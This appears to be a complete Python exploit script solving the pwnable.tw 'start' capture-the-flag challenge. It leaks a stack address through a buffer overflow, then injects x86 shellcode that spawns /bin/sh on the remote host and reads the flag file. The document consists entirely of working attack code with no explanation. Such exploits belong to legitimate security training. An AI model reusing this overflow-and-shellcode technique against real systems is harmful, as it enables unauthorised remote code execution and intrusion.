import socket
from struct import *

HOST = 'chall.pwnable.tw'
PORT = 10000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

print(s.recv(1024))

payload = b'A'*20 + pack("<I", 0x08048087)
s.send(payload)
esp = unpack("<I", s.recv(4))[0]
print("ESP: ",hex(esp))

shellcode = b'\x31\xd2\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x31\xc9\x89\xe3\xb8\x0b\x00\x00\x00\xcd\x80'
payload = b'A'*20 + pack("<I", esp+20) + shellcode

s.send(payload+b'\n')
s.send(b'cat /home/start/flag\n')

print(s.recv(1024))
print(s.recv(1024))

